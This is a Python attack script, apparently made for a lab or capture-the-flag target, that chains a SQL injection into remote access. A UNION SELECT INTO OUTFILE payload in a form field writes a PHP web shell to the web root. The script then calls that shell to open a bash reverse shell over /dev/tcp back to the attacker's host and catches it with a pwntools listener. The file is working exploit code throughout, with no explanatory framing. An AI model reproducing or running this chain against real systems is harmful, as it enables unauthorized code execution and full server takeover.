#!/usr/bin/python3

from pwn import *
import signal, pdb, requests, re
from netifaces import interfaces, ifaddresses, AF_INET

#TODO: kill all processess and recover cursor
def def_handler(sig,frame):
	print("\n\n[+] Removing payload from victim...")
	shell.sendline(b'rm /var/www/html/' + filename.encode())
	print("[!] Exit... \n")
	sys.exit(1) 
	#atexit.register(lambda: print("\x1b[?25h"))   #restore cursor
	#os._exit(1)
	
	
#Ctrl + C
signal.signal(signal.SIGINT, def_handler)

#Regex for ip_addresses
pattern = re.compile('''(((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([1-9][0-9])|([1-9]))\.){3}((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([1-9][0-9])|([1-9]))''')

if len(sys.argv) < 5 and "-p" not in sys.argv:
	log.failure("Uso: %s <rhost> [-p <rport>] filename  <lhost_netIface|lhost> <lhost_port>" % sys.argv[0])
	sys.exit(1)


def searchIface(iface):
	if pattern.search(iface):
		return iface
	for ifaceName in interfaces():
		if ifaceName == iface:
			addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP addr'}] )]
			return addresses[0]

def setOptions():
	opts = {}
	if "-p" in sys.argv:
		try:
			opts["-p"] = int(sys.argv[sys.argv.index("-p") + 1])
			sys.argv.remove(sys.argv.index("-p") + 1)
			sys.argv.remove(sys.argv.index("-p"))
			if opts["-p"] not in [n for n in range(1,65535)]:
				raise ValueError
		except Exception as E:
			print("[X] Error: port number not valid")
			sys.exit(1)
	
	return opts
			

options = setOptions()
	
#globales
lhost = searchIface(sys.argv[3])
lport = sys.argv[4]
ip_address = sys.argv[1]
rport = "80" if "-p" not in options.keys() else options["-p"]
filename = sys.argv[2]
main_url = "http://{}:{}/".format(ip_address,rport)
SQLi = """' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/{fn}"-- -""".format(fn=filename)



def printInfo():
	print("""
		[*] Execution details:
		[*] LHOST\t\t{lhost}
		[*] LPORT\t\t{lport}
		[*] RHOST\t\t{rhost}
		[*] RPORT\t\t{rport}
		[*] Payload filename\t{filename}
		[*] Injection\t\t{SQLi}
		""".format(lhost=lhost, lport=lport, rhost=ip_address, rport=rport, filename=filename, SQLi=SQLi))

def createFile():
	
	#------ Change data to post--------------
	data_post = {
		"username": "hola",
		"country" : "Azerbaijan" + SQLi
	}
	#----------------------------------------
	#pdb.set_trace()
	r = requests.post(main_url, data=data_post)

def getAccess():
	data_post = {
		'cmd' : "bash -c 'bash -i >& /dev/tcp/{att_ip}/{att_port} 0>&1'".format(att_ip=lhost, att_port=lport),
	}
	
	r = requests.post(main_url + filename, data=data_post)

	
if __name__ == "__main__":
	printInfo()
	
	createFile()
	try:
		accessThread = threading.Thread(target=getAccess, args=()).start()
	except Exception as E:
		log.error(str(E))
		
	shell = listen(lport, timeout=20).wait_for_connection()
	shell.interactive()
	
		
		
